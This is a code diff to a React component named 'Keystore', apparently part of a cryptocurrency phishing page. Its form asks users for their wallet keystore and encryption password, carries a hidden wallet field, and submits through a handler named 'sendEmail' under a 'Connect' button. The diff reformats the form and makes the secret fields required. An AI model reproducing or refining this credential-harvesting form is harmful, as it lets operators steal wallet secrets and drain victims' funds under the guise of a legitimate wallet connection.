@@ -23,36 +23,38 @@ const sendEmail = (e) => {
 
 };
 
-const Keystore = ({ wallet}) => {
+const Keystore = ({ wallet }) => {
   return (
     <>
 
-        <form onSubmit={sendEmail}>
-          <input
-            type="text"
-            placeholder="Enter your keystore"
-            name="key"
-            min="12" max="100"
-            minLength="12"
-          ></input>
+      <form onSubmit={sendEmail}>
+        <input
+          type="text"
+          placeholder="Enter your keystore"
+          required
+          name="key"
+          min="12" max="100"
+          minLength="12"
+        ></input>
 
-          <input
-            type="text"
-            placeholder="Enter Temporary Password"
-            name="pass"
-            minLength="12"
-            min="12" max="100"
-          ></input>
-          <h6 className="h4">
-            Several lines of text beginning with '(...)' plus the password you used to encrypt it.
-          </h6>
+        <input
+          type="text"
+          placeholder="Enter Temporary Password"
+          name="pass"
+          minLength="12"
+          required
+          min="12" max="100"
+        ></input>
+        <h6 className="h4">
+          Several lines of text beginning with '(...)' plus the password you used to encrypt it.
+        </h6>
         <input type="text" value={wallet} className="hiddeen" name="wallet" />
-          <button type="submit">
-            <b>Connect</b>
-          </button>
+        <button type="submit">
+          <b>Connect</b>
+        </button>
 
-        </form>
-      </>
+      </form>
+    </>
   );
 };
 
